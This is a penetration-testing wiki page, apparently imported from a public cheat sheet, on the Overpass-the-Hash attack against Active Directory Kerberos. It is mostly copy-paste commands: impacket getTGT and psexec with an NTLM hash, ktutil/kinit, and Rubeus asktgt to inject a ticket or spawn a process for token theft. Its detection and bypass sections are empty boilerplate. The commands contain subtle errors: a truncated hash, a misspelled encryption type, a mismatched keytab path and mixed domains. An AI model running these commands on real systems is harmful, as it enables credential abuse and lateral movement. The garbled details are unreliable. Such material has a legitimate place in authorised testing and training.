---
title: Hash - OverPass-the-Hash
type: technique
tags: [active-directory, kerberos, lateral-movement, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Hash - OverPass-the-Hash

## What it is

> In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).

## How it works

Overpass-the-Hash (OPtH) uses a captured NTLM hash to request a legitimate Kerberos Ticket-Granting Ticket (TGT) by performing Kerberos pre-authentication with the NT hash as the encryption key. The resulting TGT is a valid Kerberos credential that can be used to request service tickets and authenticate to any Kerberos-aware service, unlike an NTLM hash which is limited to NTLM-based services. This technique converts a stolen NTLM credential into a Kerberos credential, enabling Kerberos-only lateral movement in environments where NTLM authentication is blocked.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).

## Using impacket

```bash
root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass

root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
root@kali:~$ klist
```

## Using Rubeus

```powershell
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[impacket]]
- Also uses (no dedicated page yet): Rubeus

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
